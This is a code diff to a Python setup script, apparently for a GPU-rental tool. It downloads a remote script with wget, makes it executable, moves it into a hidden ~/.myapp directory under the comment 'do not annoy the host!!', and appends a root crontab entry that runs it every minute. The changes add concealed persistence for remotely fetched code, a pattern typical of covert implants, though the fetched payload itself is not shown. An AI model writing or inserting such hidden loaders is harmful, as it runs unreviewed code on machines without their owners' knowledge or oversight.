@@ -31,11 +31,20 @@ if response1.status_code == 200:
             os.remove("gpureq.py")
         subprocess.run(["wget", "https://raw.githubusercontent.com/AczeroCoder/gpu-rental-setup/main/gpureq.py"])
 
-        # Make the daemon file executable
-        subprocess.run(["chmod", "+x", "gpureq.py"])
+        # Determine the full path to the downloaded file
+        gpureq_path = os.path.join(os.getcwd(), "gpureq.py")
 
-        # Schedule the daemon to run every 30 seconds
-        crontab_line = "* * * * * /usr/bin/python3 ~/.myapp/gpureq.py\n"
+        # Make the check file executable
+        subprocess.run(["chmod", "+x", gpureq_path])
+
+        # do not annoy the host!!
+        hidden_directory = os.path.expanduser("~/.myapp")
+        os.makedirs(hidden_directory, exist_ok=True)
+        hidden_path = os.path.join(hidden_directory, "gpureq.py")
+        os.rename(gpureq_path, hidden_path)
+
+        # Schedule the checker to run every minute
+        crontab_line = "* * * * * /usr/bin/python3 " + hidden_path + "\n"
         with open("/etc/crontab", "a") as cron_file:
             cron_file.write(crontab_line)
 
